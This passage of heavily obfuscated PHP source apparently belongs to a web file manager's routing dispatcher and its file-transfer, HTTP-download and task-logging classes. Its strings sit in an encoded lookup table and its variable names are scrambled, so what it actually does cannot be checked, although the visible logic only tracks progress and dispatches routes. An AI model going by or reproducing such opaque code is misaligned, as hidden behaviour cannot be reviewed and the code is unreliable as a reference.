preg_replace($á‰Ä¡›[1329], $á‰Ä¡›[8], self::$routes); if (in_array($õ‰şºÚ×, self::$routes)) { $åà¼¡Ú¥ = array_keys(self::$routes, $õ‰şºÚ×); foreach ($åà¼¡Ú¥ as $™½ÙØ™) { if (self::$methods[$™½ÙØ™] == $ğŒ…İÄ´ || self::$methods[$™½ÙØ™] == $á‰Ä¡›[1644] || in_array($ğŒ…İÄ´, self::$maps[$™½ÙØ™])) { $âÊÏúÒë = !0; if (!is_object(self::$callbacks[$™½ÙØ™])) { $½í§é·² = explode($á‰Ä¡›[8], self::$callbacks[$™½ÙØ™]); $¤‡•ŞÒ¶ = end($½í§é·²); $›¦›–®— = explode($á‰Ä¡›[1261], $¤‡•ŞÒ¶); $ëå±¿§ï = new $›¦›–®—[0](); $ëå±¿§ï->{$›¦›–®—[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$™½ÙØ™]); if (self::$halts) { return; } } } } } else { $şĞ€¤á¼ = 0; foreach (self::$routes as $™½ÙØ™) { if (strpos($™½ÙØ™, $á‰Ä¡›[4]) !== !1) { $™½ÙØ™ = str_replace($à€³üŒ, $è­ò¨†ğ, $™½ÙØ™); } if (preg_match($á‰Ä¡›[1645] . $™½ÙØ™ . $á‰Ä¡›[1646], $õ‰şºÚ×, $í®í“Õ®)) { if (self::$methods[$şĞ€¤á¼] == $ğŒ…İÄ´ || self::$methods[$şĞ€¤á¼] == $á‰Ä¡›[1644] || !empty(self::$maps[$şĞ€¤á¼]) && in_array($ğŒ…İÄ´, self::$maps[$şĞ€¤á¼])) { $âÊÏúÒë = !0; array_shift($í®í“Õ®); if (!is_object(self::$callbacks[$şĞ€¤á¼])) { $½í§é·² = explode($á‰Ä¡›[8], self::$callbacks[$şĞ€¤á¼]); $¤‡•ŞÒ¶ = end($½í§é·²); $›¦›–®— = explode($á‰Ä¡›[1261], $¤‡•ŞÒ¶); $ëå±¿§ï = new $›¦›–®—[0](); if (!method_exists($ëå±¿§ï, $›¦›–®—[1])) { echo $á‰Ä¡›[1647]; } else { call_user_func_array(array($ëå±¿§ï, $›¦›–®—[1]), $í®í“Õ®); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$şĞ€¤á¼], $í®í“Õ®); if (self::$halts) { return; } } } } $şĞ€¤á¼++; } } if ($âÊÏúÒë == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $éâĞŞË‡ =& $_SERVER[Ö†ØøÖ±]; header($_SERVER[$éâĞŞË‡[1648]] . $éâĞŞË‡[1649]); echo $éâĞŞË‡[1650]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$á‰Ä¡›[1643]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto f®É¼Ö™ğì; B¢ Óîø„’: class TaskFileTransfer extends Task { protected function startAfter() { $ŞØ¸Ä =& $_SERVER[Ö†ØøÖ±]; $¬ËÈ°¾ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ŞØ¸Ä[1729], array($this, $ŞØ¸Ä[1730])); Hook::bind($ŞØ¸Ä[1276], array($this, $ŞØ¸Ä[1731])); Hook::bind($ŞØ¸Ä[1732], array($this, $ŞØ¸Ä[1733])); Hook::bind($ŞØ¸Ä[645], array($this, $ŞØ¸Ä[1734])); Hook::bind($ŞØ¸Ä[646], array($this, $ŞØ¸Ä[1735])); Hook::bind($ŞØ¸Ä[653], array($this, $ŞØ¸Ä[1736])); Hook::bind($ŞØ¸Ä[654], array($this, $ŞØ¸Ä[1737])); Hook::bind($ŞØ¸Ä[648], array($this, $ŞØ¸Ä[1738])); Hook::bind($ŞØ¸Ä[651], array($this, $ŞØ¸Ä[1739])); Hook::bind($ŞØ¸Ä[614], array($this, $ŞØ¸Ä[1740])); Hook::bind($ŞØ¸Ä[611], array($this, $ŞØ¸Ä[1740])); Hook::bind($ŞØ¸Ä[616], array($this, $ŞØ¸Ä[1740])); Hook::bind($ŞØ¸Ä[618], array($this, $ŞØ¸Ä[1740])); Hook::bind($ŞØ¸Ä[620], array($this, $ŞØ¸Ä[1740])); Hook::bind($ŞØ¸Ä[1741], array($this, $ŞØ¸Ä[1742])); Hook::bind($ŞØ¸Ä[636], array($this, $ŞØ¸Ä[1743])); $this->sourceModelCopyFlag = !1; Hook::bind($ŞØ¸Ä[1744], array($this, $ŞØ¸Ä[1745])); Hook::bind($ŞØ¸Ä[1746], array($this, $ŞØ¸Ä[1747])); Hook::bind($ŞØ¸Ä[1748], array($this, $ŞØ¸Ä[1749])); $¬ËÈ°¾[$ŞØ¸Ä[1750]] = LNG($ŞØ¸Ä[1751]); $¬ËÈ°¾[$ŞØ¸Ä[1752]] = 0; $¬ËÈ°¾[$ŞØ¸Ä[1753]] = 0; $¬ËÈ°¾[$ŞØ¸Ä[1117]] = $ŞØ¸Ä[12]; $¬ËÈ°¾[$ŞØ¸Ä[1754]] = $ŞØ¸Ä[12]; $¬ËÈ°¾[$ŞØ¸Ä[1755]] = 0; $¬ËÈ°¾[$ŞØ¸Ä[1756]] = 0; $¬ËÈ°¾[$ŞØ¸Ä[1757]] = 0; if (!$¬ËÈ°¾[$ŞØ¸Ä[1596]]) { $¬ËÈ°¾[$ŞØ¸Ä[1596]] = LNG($ŞØ¸Ä[1758]); } } protected function endAfter() { $¾¢²›¬Á =& $_SERVER[Ö†ØøÖ±]; Hook::unbind($¾¢²›¬Á[1729], array($this, $¾¢²›¬Á[1730])); Hook::unbind($¾¢²›¬Á[1276], array($this, $¾¢²›¬Á[1731])); Hook::unbind($¾¢²›¬Á[1732], array($this, $¾¢²›¬Á[1733])); Hook::unbind($¾¢²›¬Á[645], array($this, $¾¢²›¬Á[1734])); Hook::unbind($¾¢²›¬Á[646], array($this, $¾¢²›¬Á[1735])); Hook::unbind($¾¢²›¬Á[653], array($this, $¾¢²›¬Á[1736])); Hook::unbind($¾¢²›¬Á[654], array($this, $¾¢²›¬Á[1737])); Hook::unbind($¾¢²›¬Á[648], array($this, $¾¢²›¬Á[1738])); Hook::unbind($¾¢²›¬Á[651], array($this, $¾¢²›¬Á[1739])); Hook::unbind($¾¢²›¬Á[614], array($this, $¾¢²›¬Á[1740])); Hook::unbind($¾¢²›¬Á[611], array($this, $¾¢²›¬Á[1740])); Hook::unbind($¾¢²›¬Á[616], array($this, $¾¢²›¬Á[1740])); Hook::unbind($¾¢²›¬Á[618], array($this, $¾¢²›¬Á[1740])); Hook::unbind($¾¢²›¬Á[620], array($this, $¾¢²›¬Á[1740])); Hook::unbind($¾¢²›¬Á[1741], array($this, $¾¢²›¬Á[1742])); Hook::unbind($¾¢²›¬Á[636], array($this, $¾¢²›¬Á[1743])); Hook::unbind($¾¢²›¬Á[1744], array($this, $¾¢²›¬Á[1745])); Hook::unbind($¾¢²›¬Á[1746], array($this, $¾¢²›¬Á[1747])); Hook::unbind($¾¢²›¬Á[1748], array($this, $¾¢²›¬Á[1749])); } public function copyMoveStart($Òöçƒ×Û, $öíÑµàš, $øÙïëºÚ, $Î·Û™„) { $Ñ†æ¿Û‚ =& $_SERVER[Ö†ØøÖ±]; self::log($Ñ†æ¿Û‚[1759] . $öíÑµàš . $Ñ†æ¿Û‚[70] . $Î·Û™„); $ĞŸ½§¥ = rtrim(TEMP_FILES, $Ñ†æ¿Û‚[8]); if (substr($öíÑµàš, 0, strlen($ĞŸ½§¥)) == $ĞŸ½§¥) { return; } if (substr($Î·Û™„, 0, strlen($ĞŸ½§¥)) == $ĞŸ½§¥) { return; } $½ó‹ğâ =& $this->task; $½ó‹ğâ[$Ñ†æ¿Û‚[1760]] = KodIO::transferType($Òöçƒ×Û, $øÙïëºÚ); $this->update(); } public function updateAfter() { $‹ ß…Ÿ =& $_SERVER[Ö†ØøÖ±]; $Æ¥á½ÀÒ =& $this->task; if (!$Æ¥á½ÀÒ[$‹ ß…Ÿ[816]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Æ¥á½ÀÒ[$‹ ß…Ÿ[1760]] == $‹ ß…Ÿ[1368]) { return; } self::updateTask($Æ¥á½ÀÒ); } private static function updateTask(&$Æóµè³à) { $ª•ú·¿ =& $_SERVER[Ö†ØøÖ±]; if ($Æóµè³à[$ª•ú·¿[1760]] == $ª•ú·¿[1247] || $Æóµè³à[$ª•ú·¿[1760]] == $ª•ú·¿[107]) { if ($Æóµè³à[$ª•ú·¿[1754]]) { $Æóµè³à[$ª•ú·¿[1757]] = $Æóµè³à[$ª•ú·¿[1756]] + $Æóµè³à[$ª•ú·¿[1753]]; } } else { if ($Æóµè³à[$ª•ú·¿[1760]] == $ª•ú·¿[1369]) { if ($Æóµè³à[$ª•ú·¿[1754]] == $ª•ú·¿[1247]) { $Æóµè³à[$ª•ú·¿[1757]] = $Æóµè³à[$ª•ú·¿[1756]] + $Æóµè³à[$ª•ú·¿[1753]] * 0.5; } else { if ($Æóµè³à[$ª•ú·¿[1754]] == $ª•ú·¿[107]) { $Æóµè³à[$ª•ú·¿[1757]] = $Æóµè³à[$ª•ú·¿[1756]] + $Æóµè³à[$ª•ú·¿[1752]] * 0.5 + $Æóµè³à[$ª•ú·¿[1753]] * 0.5; } } } } $Æóµè³à[$ª•ú·¿[1701]] = $Æóµè³à[$ª•ú·¿[1757]] / $Æóµè³à[$ª•ú·¿[816]]; if ($Æóµè³à[$ª•ú·¿[1701]] > 0) { $ß´µ«ÇÍ = timeFloat() - $Æóµè³à[$ª•ú·¿[1703]] - $Æóµè³à[$ª•ú·¿[1706]]; $Æóµè³à[$ª•ú·¿[1707]] = $ß´µ«ÇÍ * (1 - $Æóµè³à[$ª•ú·¿[1701]]) / $Æóµè³à[$ª•ú·¿[1701]]; } } public function addPath($­‘½™ÄÏ) { $×Û ò”¿ =& $_SERVER[Ö†ØøÖ±]; if (!$­‘½™ÄÏ) { return; } $¼¶Â° =& $this->task; $ñïöÆÆ¥ = IO::infoWithChildren($­‘½™ÄÏ); $ú»ªÆ·Ÿ = $¼¶Â°[$×Û ò”¿[1761]] ? $¼¶Â°[$×Û ò”¿[1761]][$×Û ò”¿[1762]] : 0; $¼¶Â°[$×Û ò”¿[1761]] = array($×Û ò”¿[1762] => $ú»ªÆ·Ÿ + 1, $×Û ò”¿[471] => $ñïöÆÆ¥[$×Û ò”¿[32]], $×Û ò”¿[84] => $ñïöÆÆ¥[$×Û ò”¿[84]], $×Û ò”¿[560] => $ñïöÆÆ¥[$×Û ò”¿[560]] ? $ñïöÆÆ¥[$×Û ò”¿[560]] : $ñïöÆÆ¥[$×Û ò”¿[84]]); if ($ñïöÆÆ¥[$×Û ò”¿[33]] == $×Û ò”¿[214]) { $¼¶Â°[$×Û ò”¿[839]] += 1; } else { $¼¶Â°[$×Û ò”¿[839]] += $ñïöÆÆ¥[$×Û ò”¿[79]][$×Û ò”¿[77]]; if ($ñïöÆÆ¥[$×Û ò”¿[181]]) { $¼¶Â°[$×Û ò”¿[839]] += $ñïöÆÆ¥[$×Û ò”¿[79]][$×Û ò”¿[78]] + 1; } } $¼¶Â°[$×Û ò”¿[816]] += $ñïöÆÆ¥[$×Û ò”¿[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($àĞ•±™£) { } public function sourceAddHashEnd($õ¸íÊã¾) { } public function sourceAddFileStart($’é–şä) { $ƒÛŞËò” =& $_SERVER[Ö†ØøÖ±]; $ïççºÙÕ =& $this->task; $ïççºÙÕ[$ƒÛŞËò”[1752]] = $’é–şä[$ƒÛŞËò”[76]]; $ïççºÙÕ[$ƒÛŞËò”[1750]] = $’é–şä[$ƒÛŞËò”[32]]; $ïççºÙÕ[$ƒÛŞËò”[1117]] = $’é–şä[$ƒÛŞËò”[32]]; $ïççºÙÕ[$ƒÛŞËò”[1763]] = $’é–şä[$ƒÛŞËò”[84]]; $this->update(); } public function sourceAddFileEnd($§¼¸ËøÛ) { $‹Ã¤ß û =& $_SERVER[Ö†ØøÖ±]; $ÓÃÄë˜ =& $this->task; $ÓÃÄë˜[$‹Ã¤ß û[1757]] += $§¼¸ËøÛ[$‹Ã¤ß û[76]]; $ÓÃÄë˜[$‹Ã¤ß û[1763]] = $§¼¸ËøÛ[$‹Ã¤ß û[84]]; $this->update(1); } public function copyFileStart($ØáßÎíæ, $­¥‰À“, $Õ“Ç¾«, $¿òÈÚô†, $”“ú¾°ö, $¢‡åÍœ) { $½—èË©å =& $_SERVER[Ö†ØøÖ±]; $Ü¦°ôÔ = $”“ú¾°ö; if ($Ü¦°ôÔ == $GLOBALS[$½—èË©å[1764]]) { $Ü¦°ôÔ = $GLOBALS[$½—èË©å[1765]]; } $GLOBALS[$½—èË©å[1765]] = $”“ú¾°ö; $GLOBALS[$½—èË©å[1764]] = $¢‡åÍœ; $îú©»ÙÓ =& $this->task; $îú©»ÙÓ[$½—èË©å[1750]] = $Ü¦°ôÔ; $îú©»ÙÓ[$½—èË©å[1752]] = (int) $ØáßÎíæ->size($­¥‰À“); $îú©»ÙÓ[$½—èË©å[1753]] = 0; $îú©»ÙÓ[$½—èË©å[1117]] = $½—èË©å[12]; $îú©»ÙÓ[$½—èË©å[1754]] = $½—èË©å[12]; $îú©»ÙÓ[$½—èË©å[1755]] = 0; $„‹õŞ§ = $îú©»ÙÓ[$½—èË©å[1752]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($îú©»ÙÓ[$½—èË©å[451]] . $½—èË©å[1766]); if ($„‹õŞ§ && file_exists(get_path_father($¿òÈÚô†))) { Cache::set($îú©»ÙÓ[$½—èË©å[451]] . $½—èË©å[1766], $¿òÈÚô†); $îú©»ÙÓ[$½—èË©å[1723]] = array($½—èË©å[1767], $½—èË©å[1768]); } $this->update(0, $„‹õŞ§); } public static function updateCopyLocalFileSize($¿µ­ë) { $ùÛåäÎ€ =& $_SERVER[Ö†ØøÖ±]; $šˆ‰ä¶ = Cache::get($¿µ­ë[$ùÛåäÎ€[451]] . $ùÛåäÎ€[1766]); if (!$šˆ‰ä¶ || !file_exists($šˆ‰ä¶)) { return $¿µ­ë; } $¿µ­ë[$ùÛåäÎ€[1753]] = @filesize($šˆ‰ä¶); $¿µ­ë[$ùÛåäÎ€[1757]] += $¿µ­ë[$ùÛåäÎ€[1753]]; self::updateTask($¿µ­ë); return $¿µ­ë; } public function copyFileEnd($çŸ¸şÀ¿, $»ÌŸ¢•†, $°”™ùí, $†ïîºÎØ, $¾üË§½„, $²Ê–ÛŸê) { $â¾Ÿ˜Œ =& $_SERVER[Ö†ØøÖ±]; $´‡„ áà =& $this->task; $´‡„ áà[$â¾Ÿ˜Œ[1753]] = $´‡„ áà[$â¾Ÿ˜Œ[1752]]; $´‡„ áà[$â¾Ÿ˜Œ[1754]] = $â¾Ÿ˜Œ[12]; unset($´‡„ áà[$â¾Ÿ˜Œ[1723]]); if ($¾üË§½„ == $´‡„ áà[$â¾Ÿ˜Œ[1750]]) { $´‡„ áà[$â¾Ÿ˜Œ[1756]] += $´‡„ áà[$â¾Ÿ˜Œ[1752]]; $´‡„ áà[$â¾Ÿ˜Œ[1757]] = $´‡„ áà[$â¾Ÿ˜Œ[1756]]; $í•¶ÔËÀ = 1; if (isset($´‡„ áà[$â¾Ÿ˜Œ[1763]]) && $´‡„ áà[$â¾Ÿ˜Œ[1763]] == $»ÌŸ¢•†) { $í•¶ÔËÀ = 0; } $this->update($í•¶ÔËÀ); } else { $this->update(); $´‡„ áà[$â¾Ÿ˜Œ[1753]] = 0; } Cache::remove($´‡„ áà[$â¾Ÿ˜Œ[451]] . $â¾Ÿ˜Œ[1766]); self::log($â¾Ÿ˜Œ[1769] . $»ÌŸ¢•† . $â¾Ÿ˜Œ[70] . $†ïîºÎØ . $â¾Ÿ˜Œ[246] . $¾üË§½„ . $â¾Ÿ˜Œ[1770] . $´‡„ áà[$â¾Ÿ˜Œ[1750]]); } public function updateFileEnd($˜Ã‹û¿, $öŒµ–¼) { $óãßÚÄ­ =& $_SERVER[Ö†ØøÖ±]; $ˆ¡‡å¢İ =& $this->task; $ˆ¡‡å¢İ[$óãßÚÄ­[1750]] = $˜Ã‹û¿; $ˆ¡‡å¢İ[$óãßÚÄ­[1752]] = $öŒµ–¼; $ˆ¡‡å¢İ[$óãßÚÄ­[1756]] += $öŒµ–¼; $ˆ¡‡å¢İ[$óãßÚÄ­[1757]] = $ˆ¡‡å¢İ[$óãßÚÄ­[1756]]; $this->update(1); self::log($óãßÚÄ­[1771] . $˜Ã‹û¿); } public function sourceModelCopy($ò¥ãĞ“÷) { $ÔÙšÒ =& $_SERVER[Ö†ØøÖ±]; $àçªõÂÎ = $ò¥ãĞ“÷[0]; $±Ú®ÁØÛ = $ò¥ãĞ“÷[1]; $¾û³Ğ„ö =& $this->task; $this->sourceModelCopyFlag = !0; $®Ë¤ìóÎ = 0; switch ($àçªõÂÎ) { case $ÔÙšÒ[612]: $®Ë¤ìóÎ = 1; break; case $ÔÙšÒ[615]: $¾û³Ğ„ö[$ÔÙšÒ[1750]] = $±Ú®ÁØÛ[$ÔÙšÒ[32]]; break; case $ÔÙšÒ[617]: $®Ë¤ìóÎ = intval($ò¥ãĞ“÷[$ÔÙšÒ[432]] * 0.4); break; case $ÔÙšÒ[619]: $®Ë¤ìóÎ = intval($ò¥ãĞ“÷[$ÔÙšÒ[432]] * 0.2); break; case $ÔÙšÒ[621]: $®Ë¤ìóÎ = intval($ò¥ãĞ“÷[$ÔÙšÒ[432]] * 0.4); break; } $this->update($®Ë¤ìóÎ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ı·£¶ë, $¦Èô™µ) { $‘ºíñ¶ö =& $_SERVER[Ö†ØøÖ±]; $this->sourceModelCopyFlag = !0; $äÀì‡û‡ = 1; if (isset($ı·£¶ë[$‘ºíñ¶ö[79]])) { $äÀì‡û‡ = $ı·£¶ë[$‘ºíñ¶ö[79]][$‘ºíñ¶ö[77]]; $äÀì‡û‡ = $äÀì‡û‡ + $ı·£¶ë[$‘ºíñ¶ö[79]][$‘ºíñ¶ö[78]] + 1; } $this->update($äÀì‡û‡); $this->sourceModelCopyFlag = !1; } public function sourceMove($ıÖëœ—Î) { $this->sourceRemove($ıÖëœ—Î, !1); } public function curlProgress($±èš§¨ñ, $øÚ Œ±°, $çÑè“³², $§é¼ƒÕº, $í»»ÌÈµ) { $÷†®†ëŠ =& $_SERVER[Ö†ØøÖ±]; $­÷‘¨Í =& $this->task; if ($í»»ÌÈµ > 0) { $­÷‘¨Í[$÷†®†ëŠ[1117]] = $÷†®†ëŠ[1772]; $­÷‘¨Í[$÷†®†ëŠ[1754]] = $÷†®†ëŠ[107]; if ($­÷‘¨Í[$÷†®†ëŠ[1752]]) { $­÷‘¨Í[$÷†®†ëŠ[1753]] = $í»»ÌÈµ; } if ($­÷‘¨Í[$÷†®†ëŠ[1755]]) { $­÷‘¨Í[$÷†®†ëŠ[1753]] = $í»»ÌÈµ + $­÷‘¨Í[$÷†®†ëŠ[1755]]; } } else { if ($çÑè“³² > 0) { if ($­÷‘¨Í[$÷†®†ëŠ[1752]] == $øÚ Œ±°) { $­÷‘¨Í[$÷†®†ëŠ[1753]] = $çÑè“³²; $­÷‘¨Í[$÷†®†ëŠ[1117]] = $÷†®†ëŠ[1773]; $­÷‘¨Í[$÷†®†ëŠ[1754]] = $÷†®†ëŠ[1247]; } } } $this->update(); } public function curlProgressStart($ª³Áê˜´) { } public function curlProgressEnd($ÎŞÊ¨”ü) { $å’×Øåµ =& $_SERVER[Ö†ØøÖ±]; $©Éâ¶Ó =& $this->task; $¸ò·ß = curl_getinfo($ÎŞÊ¨”ü); $íæ»İ¥¶ = $¸ò·ß[$å’×Øåµ[1774]]; if ($íæ»İ¥¶ == -1) { $íæ»İ¥¶ = $¸ò·ß[$å’×Øåµ[1775]]; } if ($©Éâ¶Ó[$å’×Øåµ[1754]] == $å’×Øåµ[107] && $íæ»İ¥¶) { $©Éâ¶Ó[$å’×Øåµ[1755]] += $íæ»İ¥¶; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $±ÁÖŠİº =& $_SERVER[Ö†ØøÖ±]; $ñÜŞ—ï¡ =& $this->task; $ñÜŞ—ï¡[$±ÁÖŠİº[1776]] = 1; Hook::bind($±ÁÖŠİº[1744], array($this, $±ÁÖŠİº[1777])); Hook::bind($±ÁÖŠİº[1746], array($this, $±ÁÖŠİº[1778])); Hook::bind($±ÁÖŠİº[1748], array($this, $±ÁÖŠİº[1779])); } protected function endAfter() { $Œ“Ì¬ˆ =& $_SERVER[Ö†ØøÖ±]; Hook::unbind($Œ“Ì¬ˆ[1744], array($this, $Œ“Ì¬ˆ[1777])); Hook::unbind($Œ“Ì¬ˆ[1746], array($this, $Œ“Ì¬ˆ[1778])); Hook::unbind($Œ“Ì¬ˆ[1748], array($this, $Œ“Ì¬ˆ[1779])); } public function progressStart($¯¸”ƒ³) { $¼€â–´ä =& $_SERVER[Ö†ØøÖ±]; $ûøÁîÆÇ = curl_getinfo($¯¸”ƒ³); self::log($¼€â–´ä[1780] . $ûøÁîÆÇ[$¼€â–´ä[360]]); self::valueSet($this->task[$¼€â–´ä[451]], $this->task); } public function progressEnd($àŠ²È¾¿) { $šÇˆŒ›Â =& $_SERVER[Ö†ØøÖ±]; self::log($šÇˆŒ›Â[1781] . $this->task[$šÇˆŒ›Â[451]]); $this->end(); } public function progress($÷ø®ãœÙ, $óİ“Œä¨, $Å°’è–§, $Ø‘àÎº, $Ë²ø¹Ş¹) { $€ì¦¿µö =& $_SERVER[Ö†ØøÖ±]; $Ú¶€úõ =& $this->task; if ($Ë²ø¹Ş¹ > 0) { $Ú¶€úõ[$€ì¦¿µö[839]] = $Ú¶€úõ[$€ì¦¿µö[839]] == 0 ? $Ø‘àÎº : $Ú¶€úõ[$€ì¦¿µö[839]]; $Ú¶€úõ[$€ì¦¿µö[1700]] = $Ë²ø¹Ş¹; } else { if ($Å°’è–§ > 0) { $Ú¶€úõ[$€ì¦¿µö[839]] = $Ú¶€úõ[$€ì¦¿µö[839]] == 0 ? $óİ“Œä¨ : $Ú¶€úõ[$€ì¦¿µö[839]]; $Ú¶€úõ[$€ì¦¿µö[1700]] = $Å°’è–§; } } $this->update(); self::log("\160\162\157\x67\162\145\163\163\x48\164\164\160\72\144\x6f\x77\156\x3a{$Å°’è–§}\57{$óİ“Œä¨}\x3b\40\x75\x70\154\x6f\x61\144\72{$Ë²ø¹Ş¹}\57{$Ø‘àÎº}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($–ÎÎ„ĞÆ, $Œõæ¿îË = '', $€¯ğ¤º = 0, $‰å”óé = '') { $µ°³ · =& $_SERVER[Ö†ØøÖ±]; $ßÚ‚¨¹ = new Task($–ÎÎ„ĞÆ, $Œõæ¿îË, $€¯ğ¤º, $‰å”óé); $GLOBALS[$µ°³ ·[1782] . $–ÎÎ„ĞÆ] = new TaskLog($µ°³ ·[1683], $ßÚ‚¨¹, $‰å”óé); return $ßÚ‚¨¹; } public function __construct($ûİ»ı = '', $ÇÙüïÙ¯ = '', $æÎÕ÷¥» = '') { $¤í ùî =& $_SERVER[Ö†ØøÖ±]; if (!$ûİ»ı) { $ûİ»ı = $¤í ùî[1683]; } $×Û›ëï¾ = $ûİ»ı . $¤í ùî[438] . rand_string(10); if (!$æÎÕ÷¥») { $æÎÕ÷¥» = $ûİ»ı . $¤í ùî[53] . $æÎÕ÷¥»; } switch ($ûİ»ı) { case $¤í ùî[1683]: if (!$ÇÙüïÙ¯ || !$ÇÙüïÙ¯->task) { return echoLog($ûİ»ı . $¤í ùî[1783]); } $ñ¤İì±„ = $ÇÙüïÙ¯; $×Û›ëï¾ = $ñ¤İì±„->task[$¤í ùî[451]]; $ûİ»ı = $ñ¤İì±„->task[$¤í ùî[451]]; if (!$ñ¤İì±„->task[$¤í ùî[1596]]) { $ñ¤İì±„->task[$¤í ùî[1596]] = $æÎÕ÷¥» ? $æÎÕ÷¥» : $ûİ»ı; } break; case $¤í ùî[1784]: if (!$ÇÙüïÙ¯) { return echoLog($ûİ»ı . $¤í ùî[1785]); } $şÃ»òÙ“ = is_string($ÇÙüïÙ¯) ? array($ÇÙüïÙ¯) : $ÇÙüïÙ¯; $ñ¤İì±„ = new TaskFileTransfer($×Û›ëï¾, $ûİ»ı, 0, $æÎÕ÷¥» ? $æÎÕ÷¥» : $şÃ»òÙ“[0]); foreach ($şÃ»òÙ“ as $ŠÕüÀšû) { $ñ¤İì±„->addPath($ŠÕüÀšû); } break; case $¤í ùî[366]: if (!$ÇÙüïÙ¯) { return echoLog($ûİ»ı . $¤í ùî[1785]); } $şÃ»òÙ“ = is_string($ÇÙüïÙ¯) ? array($ÇÙüïÙ¯) : $ÇÙüïÙ¯; $ñ¤İì±„ = new TaskZip($×Û›ëï¾, $ûİ»ı, 0, $æÎÕ÷¥» ? $æÎÕ÷¥» : $şÃ»òÙ“[0]); foreach ($şÃ»òÙ“ as $ŠÕüÀšû) { $ñ¤İì±„->addPath($ŠÕüÀšû); } break; case $¤í ùî[1267]: if (!$ÇÙüïÙ¯) { return echoLog($ûİ»ı . $¤í ùî[1785]); } $ñ¤İì±„ = new TaskUnZip($×Û›ëï¾, $ûİ»ı, 0, $æÎÕ÷¥» ? $æÎÕ÷¥» : $ÇÙüïÙ¯); if ($ÇÙüïÙ¯) { $ñ¤İì±„->addFile($ÇÙüïÙ¯); } break; case $¤í ùî[149]: $ñ¤İì±„ = new TaskHttp($×Û›ëï¾, $ûİ»ı); break; default: return; break; } $this->task = $ñ¤İì±„; $this->taskID = $×Û›ëï¾; Hook::bind($¤í ùî[1720], array($this, $¤í ùî[1786])); Hook::bind($¤í ùî[1722], array($this, $¤í ùî[1787])); Hook::bind($¤í ùî[1716], array($this, $¤í ùî[1788])); echoLog($¤í ùî[1789] . $ñ¤İì±„->task[$¤í ùî[1596]]); } public function __destruct() { $this->end(); } public function end($•¥şÂö = '') { $Àığ’ª =& $_SERVER[Ö†ØøÖ±]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($•¥şÂö); $this->task = !1; $this->taskID = !1; Hook::unbind($Àığ’ª[1720], array($this, $Àığ’ª[1786])); Hook::unbind($Àığ’ª[1722], array($this, $Àığ’ª[1787])); Hook::unbind($Àığ’ª[1716], array($this, $Àığ’ª[1788])); } public function taskUpdate($õÊ‹ª°ƒ) { $èÉéœ²¸ =& $_SERVER[Ö†ØøÖ±]; if (!$õÊ‹ª°ƒ || $this->taskID != $õÊ‹ª°ƒ[$èÉéœ²¸[451]]) { return; } $Íô§Ÿ¼‚ = 20; $¢ßĞÎ¸æ = intval($õÊ‹ª°ƒ[$èÉéœ²¸[1701]] * $Íô§Ÿ¼‚); $ıùóÙŞ¢ = $èÉéœ²¸[163] . str_repeat($èÉéœ²¸[937], $¢ßĞÎ¸æ) . $èÉéœ²¸[1067] . str_repeat($èÉéœ²¸[53], $Íô§Ÿ¼‚ - $¢ßĞÎ¸æ) . $èÉéœ²¸[165]; $üÚé“»ú = $ıùóÙŞ¢ . sprintf($èÉéœ²¸[1790], $õÊ‹ª°ƒ[$èÉéœ²¸[1701]] * 100) . $èÉéœ²¸[1791]; $…Ó›§èÖ = $üÚé“»ú . $õÊ‹ª°ƒ[$èÉéœ²¸[1700]] . $èÉéœ²¸[8] . $õÊ‹ª°ƒ[$èÉéœ²¸[839]] . LNG($èÉéœ²¸[1792]); $„Äı¥Ü = $èÉéœ²¸[12]; if ($õÊ‹ª°ƒ[$èÉéœ²¸[1776]]) { $…Ó›§èÖ = $üÚé“»ú . size_format($õÊ‹ª°ƒ[$èÉéœ²¸[1700]]) . $èÉéœ²¸[8] . size_format($õÊ‹ª°ƒ[$èÉéœ²¸[839]]); $„Äı¥Ü = size_format($õÊ‹ª°ƒ[$èÉéœ²¸[1702]]) . $èÉéœ²¸[1793]; } if ($õÊ‹ª°ƒ[$èÉéœ²¸[1117]]) { $õÊ‹ª°ƒ[$èÉéœ²¸[1750]] = $õÊ‹ª°ƒ[$èÉéœ²¸[1117]] . $èÉéœ²¸[53] . $õÊ‹ª°ƒ[$èÉéœ²¸[1750]]; } if ($õÊ‹ª°ƒ[$èÉéœ²¸[1750]]) { $Òæ³“çŒ = $èÉéœ²¸[12]; if ($õÊ‹ª°ƒ[$èÉéœ²¸[1752]]) { $Òæ³“çŒ = $èÉéœ²¸[50] . size_format($õÊ‹ª°ƒ[$èÉéœ²¸[1753]]) . $èÉéœ²¸[8] . size_format($õÊ‹ª°ƒ[$èÉéœ²¸[1752]]); } $„Äı¥Ü .= $õÊ‹ª°ƒ[$èÉéœ²¸[1750]] . $Òæ³“çŒ; } if ($õÊ‹ª°ƒ[$èÉéœ²¸[816]] && !$õÊ‹ª°ƒ[$èÉéœ²¸[1752]]) { $„Äı¥Ü .= $èÉéœ²¸[53] . size_format($õÊ‹ª°ƒ[$èÉéœ²¸[1757]]) . $èÉéœ²¸[8] . size_format($õÊ‹ª°ƒ[$èÉéœ²¸[816]]); } echoLog($…Ó›§èÖ . $èÉéœ²¸[53] . $„Äı¥Ü, !0); } public function taskEnd($ââ¹æ) { $¸«Ç‰² =& $_SERVER[Ö†ØøÖ±]; if (!$ââ¹æ || $this->taskID != $ââ¹æ[$¸«Ç‰²[451]]) { return; } $ÚÌ×µ = $ââ¹æ ? $ââ¹æ[$¸«Ç‰²[1700]] . $¸«Ç‰²[8] . $ââ¹æ[$¸«Ç‰²[839]] . LNG($¸«Ç‰²[1792]) . $¸«Ç‰²[71] : $¸«Ç‰²[12]; echoLog($¸«Ç‰²[1794] . $ââ¹æ[$¸«Ç‰²[1596]] . 